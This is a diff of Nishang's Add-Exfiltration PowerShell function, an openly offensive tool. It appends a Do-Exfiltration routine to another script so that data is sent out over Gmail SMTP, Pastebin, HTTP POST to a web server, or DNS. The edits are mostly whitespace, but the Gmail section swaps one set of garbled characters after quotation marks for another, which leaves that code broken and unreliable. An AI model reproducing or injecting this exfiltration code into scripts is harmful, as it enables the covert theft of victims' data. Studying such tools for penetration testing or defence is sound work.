@@ -1,5 +1,3 @@
-
-
 function Add-Exfiltration
 {
 <#
@@ -62,12 +60,13 @@ See the help of Do-Exfiltraion.ps1 to understand various options for exfiltratio
 http://labofapenetrationtester.com/
 https://github.com/samratashok/nishang
 #>
-    [CmdletBinding()] Param (
-        [Parameter(Position = 0, Mandatory = $True)] 
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)]
         [String]
         $ScriptPath,
 
-        [Parameter(Position = 1, Mandatory = $True)] 
+        [Parameter(Position = 1, Mandatory = $True)]
         [String]
         $FilePath
     )
@@ -76,11 +75,11 @@ https://github.com/samratashok/nishang
         function Do-Exfiltration
         {
             [CmdletBinding()] Param(
-        
+
                 [Parameter(Position = 0, Mandatory = $True, ValueFromPipeLine = $True)] 
                 [String]
                 $Data,
-        
+
                 [Parameter(Position = 1, Mandatory = $True)] [ValidateSet("gmail","pastebin","WebServer","DNS")]
                 [String]
                 $ExfilOption,
@@ -100,7 +99,7 @@ https://github.com/samratashok/nishang
                 [Parameter(Position = 5, Mandatory = $False)]
                 [String]
                 $URL,
-      
+
                 [Parameter(Position = 6, Mandatory = $False)]
                 [String]
                 $DomainName,
@@ -110,8 +109,8 @@ https://github.com/samratashok/nishang
                 $AuthNS
             )
 
-            function post_http($url,$parameters) 
-            { 
+            function post_http($url,$parameters)
+            {
                 $http_request = New-Object -ComObject Msxml2.XMLHTTP 
                 $http_request.open("POST", $url, $false) 
                 $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
@@ -147,13 +146,13 @@ https://github.com/samratashok/nishang
             elseif ($exfiloption -eq "gmail")
             {
                 #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
-                $smtpserver = "smtp.gmail.com"ù
+                $smtpserver = "smtp.gmail.com"ÔøΩ
                 $msg = new-object Net.Mail.MailMessage
                 $smtp = new-object Net.Mail.SmtpClient($smtpServer )
                 $smtp.EnableSsl = $True
-                $smtp.Credentials = New-Object System.Net.NetworkCredential("$username"ù, "$password"ù); 
-                $msg.From = "$username@gmail.com"ù
-                $msg.To.Add("ù$username@gmail.com"ù)
+                $smtp.Credentials = New-Object System.Net.NetworkCredential("$username"ÔøΩ, "$password"ÔøΩ); 
+                $msg.From = "$username@gmail.com"ÔøΩ
+                $msg.To.Add("ÔøΩ$username@gmail.com"ÔøΩ)
                 $msg.Subject = "Exfiltrated Data"
                 $msg.Body = $Data
                 if ($filename)
@@ -190,7 +189,5 @@ https://github.com/samratashok/nishang
 '@
     $ScriptContent = Get-Content $ScriptPath
     Out-File -InputObject $ScriptContent -FilePath "$Filepath"
-    Out-File -InputObject $Exfiltration -Append  -FilePath "$Filepath"
+    Out-File -InputObject $Exfiltration -Append -FilePath "$Filepath"
 }
-
-
